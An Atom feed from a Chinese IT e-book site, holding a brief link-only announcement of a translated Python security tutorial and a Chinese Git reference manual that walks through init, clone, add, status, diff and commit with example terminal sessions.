<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[计算机电子书]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://it-ebooks.flygon.net/"/>
  <updated>2016-02-29T07:04:04.562Z</updated>
  <id>http://it-ebooks.flygon.net/</id>
  
  <author>
    <name><![CDATA[Flygon]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[python 安全编程教程]]></title>
    <link href="http://it-ebooks.flygon.net/py-sec-tutorial/"/>
    <id>http://it-ebooks.flygon.net/py-sec-tutorial/</id>
    <published>2016-02-29T07:01:53.000Z</published>
    <updated>2016-02-29T07:04:04.562Z</updated>
    <content type="html"><![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/py-sec-tutorial.jpg?build=1452128971588&amp;v=12.0.2" alt=""></p>
<p>原文：<a href="http://www.primalsecurity.net/tutorials/python-tutorials/" target="_blank" rel="external">Python Tutorials</a></p>
<p>译者：<a href="https://github.com/smartFlash" target="_blank" rel="external">smartFlash</a></p>
<p>来源：<a href="https://github.com/smartFlash" target="_blank" rel="external">pySecurity</a></p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://www.gitbook.com/book/wizardforcel/py-sec-tutorial/details" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="https://www.gitbook.com/download/pdf/book/wizardforcel/py-sec-tutorial" target="_blank" rel="external">PDF格式</a></li>
<li><a href="https://www.gitbook.com/download/epub/book/wizardforcel/py-sec-tutorial" target="_blank" rel="external">EPUB格式</a></li>
<li><a href="https://www.gitbook.com/download/mobi/book/wizardforcel/py-sec-tutorial" target="_blank" rel="external">MOBI格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/py-sec-tutorial.jpg?build=1452128971588&amp;v=12.0.2" alt=""></p>
<p>原文：<a href="http://www.primalsecurity.net/tutorials/python-tutorials/">Python Tutorials</a></p>
<p>译者：<a href="https://github.com/smartFlash">smartFlash</a></p>
<p>来源：<a href="https://github.com/smartFlash">pySecurity</a></p>]]>
    
    </summary>
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="渗透" scheme="http://it-ebooks.flygon.net/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Git 参考手册]]></title>
    <link href="http://it-ebooks.flygon.net/git-ref/"/>
    <id>http://it-ebooks.flygon.net/git-ref/</id>
    <published>2016-02-29T06:47:41.000Z</published>
    <updated>2016-02-29T06:47:09.134Z</updated>
    <content type="html"><![CDATA[<h1 id="Git_手册简介">Git 手册简介</h1><p>本站为 Git 参考手册。目的是为学习与记忆 Git 使用中最重要、最普遍的命令提供快速翻阅。 这些命令以你可能需要的操作类型划分，并且将提供日常使用中需要的一些常用的命令以及参数。</p>
<p>每个章节都有到下一个章节的链接，所以本手册也可以当作一个入门指导。 每个页面还有一个深度 Git 文档阅读的链接，比如官方的使用手册页面或者 <a href="http://git-scm.com/book" target="_blank" rel="external">《Pro Git》</a> 书中的相关章节，以便于你学习了解更多的 Git 命令。首先，我们要从如何以 Git 的思维方式管理源代码开始。<a id="more"></a></p>
<h2 id="如何以_Git_的方式思考">如何以 Git 的方式思考</h2><p>懂得 Git，第一件重要的事情就是要知道它与 Subversion、Perforce 或者任何你用过的版本控制工具都有着很大的差别。 通常，忘掉你预想的版本控制方式，改以 Git 的方式思考，能够帮助你更好地学习 Git。</p>
<p>让我们从头开始。假设你正在设计一个新的源代码管理系统。在你使用某个工具之前，是如何完成基本的源码版本控制工作的呢？ 十有八九，你只是在项目到达某些阶段的时候，对项目做一份拷贝。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp -R project project.bak</span><br></pre></td></tr></table></figure>
<p>这样，你就可以在事情变得一团糟的时候很方便的返回到之前的状态，或者通过对比当前的项目与之前的拷贝，看看自己在之后的工作中，都做了哪些修改。</p>
<p>如果你有点偏执，你可能会经常作上面说的事情，或许还会给项目拷贝加个日期：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp -R project project.2010-06-01.bak</span><br></pre></td></tr></table></figure>
<p>如此，你就有了一堆项目在各个阶段的快照，来作比较、查看。使用这种模式，你还可以有效地与人分享项目变更。 如果你会在项目到达一定阶段的时候给它打个包，丢到自己的网站上，那其他的开发者们，就能很方便地下载它，做点改动，并给你补丁回馈。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://example.com/project.2010-06-01.zip&#10;$ unzip project.2010-06-01.zip&#10;$ cp -R project.2010-06-01 project-my-copy&#10;$ cd project-my-copy&#10;$ (&#20570;&#20102;&#26576;&#20123;&#20462;&#25913;)&#10;$ diff project-my-copy project.2010-06-01 &#62; change.patch&#10;$ (&#36890;&#36807;E-mail&#21457;&#36865;&#20462;&#25913;&#34917;&#19969;)</span><br></pre></td></tr></table></figure>
<p>以此方式，原先的开发者就能将其他人的改动应用到他的项目中去，其他开发者也能了解你做的变更。其实这便是许多开源项目采用过多年的协作方式。</p>
<p>这办法其实很好使，所以假设我们现在想要写个工具，让这个办法更快、更简单。 我们与其实现一个工具以记录每个文件的版本，可能不如去实现个工具以使创建、储存项目的快照更加方便，不用每次都去人肉作整个项目的拷贝。</p>
<p>这就是 Git 的精要所在。你通过 <code>git commit</code>告诉 Git 你想保存一份项目快照， Git 就会为你的项目中的各个文件的当前状态存一份记录。之后，绝大部分的 Git 命令都围绕这些记录展开。 比如查看它们的区别（diff），提取它们的内容，等等。</p>
<p><img src="../img/git-ref/snapshots.png" alt=""></p>
<p>如果你将 Git 看作一个排序、对比以及合并项目更新的工具，那就容易理解状况和正确做事了。</p>
<h1 id="获取与创建项目">获取与创建项目</h1><p>你得先有一个 Git 仓库，才能用它进行操作。仓库是 Git 存放你要保存的快照的数据的地方。</p>
<p>拥有一个 Git 仓库的途径有两种。在已有的目录中，初始化一个新的，其一。 比如一个新的项目，或者一个已存在的项目，但该项目尚未有版本控制。如果你想要复制一份别人的项目， 或者与别人合作某个项目，也可以从一个公开的 Git 仓库克隆，其二。本章将对两者都做介绍。</p>
<h2 id="git_init_将一个目录初始化为_Git_仓库"><code>git init</code> 将一个目录初始化为 Git 仓库</h2><p><a href="http://git-scm.com/docs/git-init" target="_blank" rel="external">文档</a>  </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Getting-a-Git-Repository#Initializing-a-Repository-in-an-Existing-Directory" target="_blank" rel="external">书</a></p>
<p>在目录中执行 <code>git init</code>，就可以创建一个 Git 仓库了。比如，我们恰好有个目录，里头有些许文件，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd konichiwa&#10;$ ls&#10;README   hello.rb</span><br></pre></td></tr></table></figure>
<p>在这个项目里头，我们会用各种编程语言写 “Hello World” 实例。 到目前为止，我们只有 Ruby 的，不过，这才刚上路嘛。为了开始用 Git 对这个项目作版本控制，我们执行一下 <code>git init</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git init&#10;Initialized empty Git repository in /opt/konichiwa/.git/&#10;# &#22312; /opt/konichiwa/.git &#30446;&#24405;&#21021;&#22987;&#21270;&#31354; Git &#20179;&#24211;&#23436;&#27605;&#12290;</span><br></pre></td></tr></table></figure>
<p>现在你可以看到在你的项目目录中有个 <code>.git</code> 的子目录。 这就是你的 Git 仓库了，所有有关你的此项目的快照数据都存放在这里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -a&#10;.        ..       .git     README   hello.rb</span><br></pre></td></tr></table></figure>
<p>恭喜，现在你就有了一个 Git 仓库的架子，可以开始快照你的项目了。</p>
<p><strong>简而言之</strong>，用 <code>git init</code> 来在目录中创建新的 Git 仓库。 你可以在任何时候、任何目录中这么做，完全是本地化的。</p>
<h2 id="git_clone_复制一个_Git_仓库，以上下其手"><code>git clone</code> 复制一个 Git 仓库，以上下其手</h2><p><a href="http://git-scm.com/docs/git-clone" target="_blank" rel="external">文档</a>  </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Getting-a-Git-Repository#Cloning-an-Existing-Repository" target="_blank" rel="external">书</a> </p>
<p>如果你需要与他人合作一个项目，或者想要复制一个项目，看看代码，你就可以克隆那个项目。 执行 <code>git clone [url]</code>，[url] 为你想要复制的项目，就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone git://github.com/schacon/simplegit.git&#10;Initialized empty Git repository in /private/tmp/simplegit/.git/&#10;remote: Counting objects: 100, done.&#10;remote: Compressing objects: 100% (86/86), done.&#10;remote: Total 100 (delta 35), reused 0 (delta 0)&#10;Receiving objects: 100% (100/100), 9.51 KiB, done.&#10;Resolving deltas: 100% (35/35), done.&#10;$ cd simplegit/&#10;$ ls&#10;README   Rakefile lib</span><br></pre></td></tr></table></figure>
<p>上述操作将复制该项目的全部记录，让你本地拥有这些。并且该操作将拷贝该项目的主分支， 使你能够查看代码，或编辑、修改。进到该目录中，你会看到 <code>.git</code> 子目录。 所有的项目数据都存在那里。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls -a&#10;.        ..       .git     README   Rakefile lib&#10;$ cd .git&#10;$ ls&#10;HEAD        description info        packed-refs&#10;branches    hooks       logs        refs&#10;config      index       objects</span><br></pre></td></tr></table></figure>
<p>默认情况下，Git 会按照你提供的 URL 所指示的项目的名称创建你的本地项目目录。 通常就是该 URL 最后一个 <code>/</code> 之后的任何东西。如果你想要一个不一样的名字， 你可以在该命令后加上它，就在那个 URL 后面。</p>
<p><strong>简而言之</strong>，使用 <code>git clone</code> 拷贝一个 Git 仓库到本地，让自己能够查看该项目，或者进行修改。</p>
<h1 id="基本快照">基本快照</h1><p><a href="http://git-scm.com/book/en/Git-Basics-Recording-Changes-to-the-Repository" target="_blank" rel="external">书</a></p>
<p>Git 的工作就是创建和保存你的项目的快照及与之后的快照进行对比。本章将对有关创建与提交你的项目的快照的命令作介绍。</p>
<p>这里有个重要的概念，Git 有一个叫做“索引”的东东，有点像是你的快照的缓存区。这就使你能够从更改的文件中创建出一系列组织良好的快照，而不是一次提交所有的更改。</p>
<p><strong>简而言之</strong>，使用 <code>git add</code> 添加需要追踪的新文件和待提交的更改， 然后使用 <code>git status</code> 和 <code>git diff</code> 查看有何改动， 最后用 <code>git commit</code> 将你的快照记录。这就是你要用的基本流程，绝大部分时候都是这样的。</p>
<h2 id="git_add_添加文件到缓存"><code>git add</code> 添加文件到缓存</h2><p><a href="http://git-scm.com/docs/git-add" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Recording-Changes-to-the-Repository#Tracking-New-Files" target="_blank" rel="external">书</a> </p>
<p>在 Git 中，在提交你修改的文件之前，你需要把它们添加到缓存。如果该文件是新创建的，你可以执行 <code>git add</code> 将该文件添加到缓存，但是，即使该文件已经被追踪了 —— 也就是说，曾经提交过了 —— 你仍然需要执行 &lt;cpde&gt;git add 将新更改的文件添加到缓存去。让我们看几个例子：&lt;/cpde&gt;</p>
<p>回到我们的 Hello World 示例，初始化该项目之后，我们就要用 <code>git add</code> 将我们的文件添加进去了。 我们可以用 <code>git status</code> 看看我们的项目的当前状态。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10;?? README&#10;?? hello.rb</span><br></pre></td></tr></table></figure>
<p>我们有俩尚未被追踪的文件，得添加一下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add README hello.rb</span><br></pre></td></tr></table></figure>
<p>现在我们再执行 <code>git status</code>，就可以看到这俩文件已经加上去了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10;A  README&#10;A  hello.rb</span><br></pre></td></tr></table></figure>
<p>新项目中，添加所有文件很普遍，可以在当前工作目录执行命令：<code>git add .</code>。 因为 Git 会递归地将你执行命令时所在的目录中的所有文件添加上去，所以如果你将当前的工作目录作为参数， 它就会追踪那儿的所有文件了。如此，<code>git add .</code> 就和 <code>git add README hello.rb</code> 有一样的效果。 此外，效果一致的还有 <code>git add *</code>，不过那只是因为我们这还木有子目录，不需要递归地添加新文件。</p>
<p>好了，现在我们改个文件，再跑一下 <code>git status</code>，有点古怪。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim README&#10;$ git status -s&#10;AM README&#10;A  hello.rb</span><br></pre></td></tr></table></figure>
<p>“AM” 状态的意思是，这个文件在我们将它添加到缓存之后又有改动。这意味着如果我们现在提交快照， 我们记录的将是上次跑 <code>git add</code> 的时候的文件版本，而不是现在在磁盘中的这个。 Git 并不认为磁盘中的文件与你想快照的文件必须是一致的 —— （如果你需要它们一致，）得用 <code>git add</code> 命令告诉它。</p>
<p><strong>一言以蔽之</strong>， 当你要将你的修改包含在即将提交的快照里的时候，执行 <code>git add</code>。 任何你没有添加的改动都不会被包含在内 —— 这意味着你可以比绝大多数其他源代码版本控制系统更精确地归置你的快照。</p>
<p>请查看《Pro Git》中 <code>git add</code> 的 “-p” 参数，以了解更多关于提交文件的灵活性的例子。</p>
<h2 id="git_status_查看你的文件在工作目录与缓存的状态"><code>git status</code> 查看你的文件在工作目录与缓存的状态</h2><p><a href="http://git-scm.com/docs/git-status" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Recording-Changes-to-the-Repository#Checking-the-Status-of-Your-Files" target="_blank" rel="external">书</a> </p>
<p>正如你在 <code>git add</code> 小节中所看到的，你可以执行 <code>git status</code> 命令查看你的代码在缓存与当前工作目录的状态。我演示该命令的时候加了 <code>-s</code> 参数，以获得简短的结果输出。 若没有这个标记，命令 <code>git status</code> 将告诉你更多的提示与上下文欣喜。 以下便是同样状态下，有跟没有 <code>-s</code> 参数的输出对比。简短的输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10;AM README&#10;A  hello.rb</span><br></pre></td></tr></table></figure>
<p>而同样的状态，详细的输出看起来是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status&#10;# On branch master&#10;#&#10;# Initial commit&#10;#&#10;# Changes to be committed:&#10;#   (use &#34;git rm --cached &#60;file&#62;...&#34; to unstage)&#10;#&#10;# new file:   README&#10;# new file:   hello.rb&#10;#&#10;# Changed but not updated:&#10;#   (use &#34;git add &#60;file&#62;...&#34; to update what will be committed)&#10;#   (use &#34;git checkout -- &#60;file&#62;...&#34; to discard changes in working directory)&#10;#&#10;# modified:   README&#10;#</span><br></pre></td></tr></table></figure>
<p>你很容易发现简短的输出看起来很紧凑。而详细输出则很有帮助，提示你可以用何种命令完成你接下来可能要做的事情。</p>
<p>Git 还会告诉你在你上次提交之后，有哪些文件被删除、修改或者存入缓存了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10;M  README&#10; D hello.rb</span><br></pre></td></tr></table></figure>
<p>你可以看到，在简短输出中，有两栏。第一栏是缓存的，第二栏则是工作目录的。 所以假设你临时提交了 README 文件，然后又改了些，并且没有执行 <code>git add</code>，你会看到这个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10;MM README&#10; D hello.rb</span><br></pre></td></tr></table></figure>
<p><strong>一言以蔽之</strong>，执行 <code>git status</code> 以查看在你上次提交之后有啥被修改或者临时提交了， 从而决定自己是否需要提交一次快照，同时也能知道有什么改变被记录进去了。</p>
<h2 id="git_diff_显示已写入缓存与已修改但尚未写入缓存的改动的区别"><code>git diff</code> 显示已写入缓存与已修改但尚未写入缓存的改动的区别</h2><p><a href="http://git-scm.com/docs/git-diff" target="_blank" rel="external">文档</a>  </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Recording-Changes-to-the-Repository#Viewing-Your-Staged-and-Unstaged-Changes" target="_blank" rel="external">书</a>  </p>
<p><code>git diff</code> 有两个主要的应用场景。我们将在此介绍其一， 在 <a href="/inspect">检阅与对照</a> 一章中，我们将介绍其二。 我们这里介绍的方式是用此命令描述已临时提交的或者已修改但尚未提交的改动。</p>
<h3 id="git_diff_#尚未缓存的改动"><code>git diff</code> #尚未缓存的改动</h3><p>如果没有其他参数，<code>git diff</code> 会以规范化的 diff 格式（一个补丁）显示自从你上次提交快照之后尚未缓存的所有更改。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim hello.rb&#10;$ git status -s&#10; M hello.rb&#10;$ git diff&#10;diff --git a/hello.rb b/hello.rb&#10;index d62ac43..8d15d50 100644&#10;--- a/hello.rb&#10;+++ b/hello.rb&#10;@@ -1,7 +1,7 @@&#10; class HelloWorld&#10;&#10;   def self.hello&#10;-    puts &#34;hello world&#34;&#10;+    puts &#34;hola mundo&#34;&#10;   end&#10;&#10; end</span><br></pre></td></tr></table></figure>
<p>所以，<code>git status</code>显示你上次提交更新至后所更改或者写入缓存的改动， 而 <code>git diff</code> 一行一行地显示这些改动具体是啥。 通常执行完 <code>git status</code> 之后接着跑一下 <code>git diff</code> 是个好习惯。</p>
<h3 id="git_diff_-cached_#查看已缓存的改动"><code>git diff --cached</code> #查看已缓存的改动</h3><p><code>git diff --cached</code> 命令会告诉你有哪些内容已经写入缓存了。 也就是说，此命令显示的是接下来要写入快照的内容。所以，如果你将上述示例中的 <code>hello.rb</code> 写入缓存，因为 <code>git diff</code> 显示的是尚未缓存的改动，所以在此执行它不会显示任何信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10; M hello.rb&#10;$ git add hello.rb &#10;$ git status -s&#10;M  hello.rb&#10;$ git diff&#10;$</span><br></pre></td></tr></table></figure>
<p>如果你想看看已缓存的改动，你需要执行的是 <code>git diff --cached</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10;M  hello.rb&#10;$ git diff&#10;$ &#10;$ git diff --cached&#10;diff --git a/hello.rb b/hello.rb&#10;index d62ac43..8d15d50 100644&#10;--- a/hello.rb&#10;+++ b/hello.rb&#10;@@ -1,7 +1,7 @@&#10; class HelloWorld&#10;&#10;   def self.hello&#10;-    puts &#34;hello world&#34;&#10;+    puts &#34;hola mundo&#34;&#10;   end&#10;&#10; end</span><br></pre></td></tr></table></figure>
<h3 id="git_diff_HEAD_查看已缓存的与未缓存的所有改动"><code>git diff HEAD</code> 查看已缓存的与未缓存的所有改动</h3><p>如果你想一并查看已缓存的与未缓存的改动，可以执行 <code>git diff HEAD</code> —— 也就是说你要看到的是工作目录与上一次提交的更新的区别，无视缓存。 假设我们又改了些 <code>ruby.rb</code> 的内容，那缓存的与未缓存的改动我们就都有了。 以上三个 <code>diff</code> 命令的结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim hello.rb &#10;$ git diff&#10;diff --git a/hello.rb b/hello.rb&#10;index 4f40006..2ae9ba4 100644&#10;--- a/hello.rb&#10;+++ b/hello.rb&#10;@@ -1,7 +1,7 @@&#10; class HelloWorld&#10;&#10;+  # says hello&#10;   def self.hello&#10;     puts &#34;hola mundo&#34;&#10;   end&#10;&#10; end&#10;$ git diff --cached&#10;diff --git a/hello.rb b/hello.rb&#10;index 2aabb6e..4f40006 100644&#10;--- a/hello.rb&#10;+++ b/hello.rb&#10;@@ -1,7 +1,7 @@&#10; class HelloWorld&#10;&#10;   def self.hello&#10;-    puts &#34;hello world&#34;&#10;+    puts &#34;hola mundo&#34;&#10;   end&#10;&#10; end&#10;$ git diff HEAD&#10;diff --git a/hello.rb b/hello.rb&#10;index 2aabb6e..2ae9ba4 100644&#10;--- a/hello.rb&#10;+++ b/hello.rb&#10;@@ -1,7 +1,8 @@&#10; class HelloWorld&#10;&#10;+  # says hello&#10;   def self.hello&#10;-    puts &#34;hello world&#34;&#10;+    puts &#34;hola mundo&#34;&#10;   end&#10;&#10; end</span><br></pre></td></tr></table></figure>
<h3 id="git_diff_-stat_显示摘要而非整个_diff"><code>git diff --stat</code> 显示摘要而非整个 diff</h3><p>如果我们不想要看整个 diff 输出，但是又想比 <code>git status</code> 详细点， 就可以用 <code>--stat</code> 选项。该选项使它显示摘要而非全文。上文示例在使用 <code>--stat</code> 选项时，输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s&#10;MM hello.rb&#10;$ git diff --stat&#10; hello.rb |    1 +&#10; 1 files changed, 1 insertions(+), 0 deletions(-)&#10;$ git diff --cached --stat&#10; hello.rb |    2 +-&#10; 1 files changed, 1 insertions(+), 1 deletions(-)&#10;$ git diff HEAD --stat&#10; hello.rb |    3 ++-&#10; 1 files changed, 2 insertions(+), 1 deletions(-)</span><br></pre></td></tr></table></figure>
<p>你还可以在上述命令后面制定一个目录，从而只查看特定文件或子目录的 <code>diff</code> 输出。</p>
<p><strong>简而言之</strong>， 执行 <code>git diff</code> 来查看执行 <code>git status</code> 的结果的详细信息 —— 一行一行地显示这些文件是如何被修改或写入缓存的。</p>
<h2 id="git_commit_记录缓存内容的快照"><code>git commit</code> 记录缓存内容的快照</h2><p><a href="http://git-scm.com/docs/git-commit" target="_blank" rel="external">文档</a>   </p>
<p><a href="http://git-scm.com/book/en/Git-Basics-Recording-Changes-to-the-Repository#Committing-Your-Changes" target="_blank" rel="external">书</a> </p>
<p>现在你使用 <code>git add</code> 命令将想要快照的内容写入了缓存， 执行 <code>git commit</code> 就将它实际存储快照了。 Git 为你的每一个提交都记录你的名字与电子邮箱地址，所以第一步是告诉 Git 这些都是啥。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &#39;Your Name&#39;&#10;$ git config --global user.email you@somedomain.com</span><br></pre></td></tr></table></figure>
<p>让我们写入缓存，并提交对 <code>hello.rb</code> 的所有改动。在首个例子中，我们使用 <code>-m</code> 选项以在命令行中提供提交注释。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add hello.rb &#10;$ git status -s&#10;M  hello.rb&#10;$ git commit -m &#39;my hola mundo changes&#39;&#10;[master 68aa034] my hola mundo changes&#10; 1 files changed, 2 insertions(+), 1 deletions(-)</span><br></pre></td></tr></table></figure>
<p>现在我们已经记录了快照。如果我们再执行 <code>git status</code>，会看到我们有一个“干净的工作目录”。 这意味着我们在最近一次提交之后，没有做任何改动 —— 在我们的项目中没有未快照的工作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status&#10;# On branch master&#10;nothing to commit (working directory clean)</span><br></pre></td></tr></table></figure>
<p>如果你漏掉了 <code>-m</code> 选项，Git 会尝试为你打开一个编辑器以填写提交信息。 如果 Git 在你对它的配置中找不到相关信息，默认会打开 <code>vim</code>。屏幕会像这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># Please enter the commit message for your changes. Lines starting&#10;# with &#39;#&#39; will be ignored, and an empty message aborts the commit.&#10;# On branch master&#10;# Changes to be committed:&#10;#   (use &#34;git reset HEAD &#60;file&#62;...&#34; to unstage)&#10;#&#10;# modified:   hello.rb&#10;#&#10;~&#10;~&#10;&#34;.git/COMMIT_EDITMSG&#34; 9L, 257C</span><br></pre></td></tr></table></figure>
<p>在此，你在文件头部添加实际的提交信息。以“#”开头的行都会被无视 ——Git 将 <code>git status</code> 的输出结果放在那儿以提示你都改了、缓存了啥。</p>
<p>通常，撰写良好的提交信息是很重要的。以开放源代码项目为例，多多少少以以下格式写你的提示消息是个不成文的规定：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#31616;&#30701;&#30340;&#20851;&#20110;&#25913;&#21160;&#30340;&#24635;&#32467;&#65288;25&#20010;&#23383;&#25110;&#32773;&#26356;&#23569;&#65289;&#10;&#10;&#22914;&#26524;&#26377;&#24517;&#35201;&#65292;&#26356;&#35814;&#32454;&#30340;&#35299;&#37322;&#25991;&#23383;&#12290;&#32422; 36 &#23383;&#26102;&#25442;&#34892;&#12290;&#22312;&#26576;&#20123;&#24773;&#20917;&#19979;&#65292;&#10;&#31532;&#19968;&#34892;&#20250;&#34987;&#20316;&#20026;&#30005;&#23376;&#37038;&#20214;&#30340;&#24320;&#22836;&#65292;&#32780;&#21097;&#20313;&#30340;&#21017;&#20250;&#20316;&#20026;&#37038;&#20214;&#20869;&#23481;&#12290;&#10;&#23558;&#23567;&#32467;&#20174;&#20869;&#23481;&#38548;&#24320;&#30340;&#31354;&#34892;&#26159;&#33267;&#20851;&#37325;&#35201;&#30340;&#65288;&#38500;&#38750;&#20320;&#27809;&#26377;&#20869;&#23481;&#65289;&#65307;&#10;&#22914;&#26524;&#36825;&#20004;&#20010;&#24453;&#22312;&#19968;&#36215;&#65292;&#26377;&#20123; git &#24037;&#20855;&#20250;&#29359;&#36855;&#31946;&#12290;&#10;&#10;&#31354;&#34892;&#20043;&#21518;&#26159;&#26356;&#22810;&#30340;&#27573;&#33853;&#12290;&#10;&#10; - &#21015;&#34920;&#20063;&#21487;&#20197;&#10;&#10; - &#36890;&#24120;&#20351;&#29992;&#36830;&#23383;&#31526;&#65288;-&#65289;&#25110;&#32773;&#26143;&#21495;&#65288;*&#65289;&#26469;&#26631;&#35760;&#21015;&#34920;&#65292;&#21069;&#38754;&#26377;&#20010;&#31354;&#26684;&#65292;&#10;   &#22312;&#21015;&#34920;&#39033;&#20043;&#38388;&#26377;&#31354;&#34892;&#65292;&#19981;&#36807;&#36825;&#20123;&#32422;&#23450;&#20063;&#20250;&#26377;&#20123;&#21464;&#21270;&#12290;&#10;&#10;# Please enter the commit message for your changes. Lines starting&#10;# with &#39;#&#39; will be ignored, and an empty message aborts the commit.&#10;# On branch master&#10;# Changes to be committed:&#10;#   (use &#34;git reset HEAD &#60;file&#62;...&#34; to unstage)&#10;#&#10;# modified:   hello.rb&#10;#&#10;~&#10;~&#10;~&#10;&#34;.git/COMMIT_EDITMSG&#34; 25L, 884C written</span><br></pre></td></tr></table></figure>
<p>提交注解是很重要的。因为 Git 很大一部分能耐就是它在组织本地提交和与他人分享的弹性， 它很给力地能够让你为逻辑独立的改变写三到四条提交注解，以便你的工作被同仁审阅。因为提交与推送改动是有区别的， 请务必花时间将各个逻辑独立的改动放到另外一个提交，并附上一份良好的提交注解， 以使与你合作的人能够方便地了解你所做的，以及你为何要这么做。</p>
<h3 id="git_commit_-a_自动将在提交前将已记录、修改的文件放入缓存区"><code>git commit -a</code> 自动将在提交前将已记录、修改的文件放入缓存区</h3><p>如果你觉得 <code>git add</code> 提交缓存的流程太过繁琐，Git 也允许你用 <code>-a</code> 选项跳过这一步。 基本上这句话的意思就是，为任何已有记录的文件执行 <code>git add</code> —— 也就是说，任何在你最近的提交中已经存在，并且之后被修改的文件。 这让你能够用更 Subversion 方式的流程，修改些文件，然后想要快照所有所做的改动的时候执行 <code>git commit -a</code>。 不过你仍然需要执行 <code>git add</code> 来添加新文件，就像 Subversion 一样。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim hello.rb&#10;$ git status -s&#10; M  hello.rb&#10;$ git commit -m &#39;changes to hello file&#39;&#10;# On branch master&#10;# Changed but not updated:&#10;#   (use &#34;git add &#60;file&#62;...&#34; to update what will be committed)&#10;#   (use &#34;git checkout -- &#60;file&#62;...&#34; to discard changes in working directory)&#10;#&#10;# modified:   hello.rb&#10;#&#10;no changes added to commit (use &#34;git add&#34; and/or &#34;git commit -a&#34;)&#10;$ git commit -am &#39;changes to hello file&#39;&#10;[master 78b2670] changes to hello file&#10; 1 files changed, 2 insertions(+), 1 deletions(-)</span><br></pre></td></tr></table></figure>
<p>注意，如果你不缓存改动，直接执行 <code>git commit</code>，Git 会直接给出 <code>git status</code> 命令的输出，提醒你啥也没缓存。我已将该消息中的重要部分高亮，它说没有添加需要提交的缓存。 如果你使用 <code>-a</code>，它会缓存并提交每个改动（不含新文件）。</p>
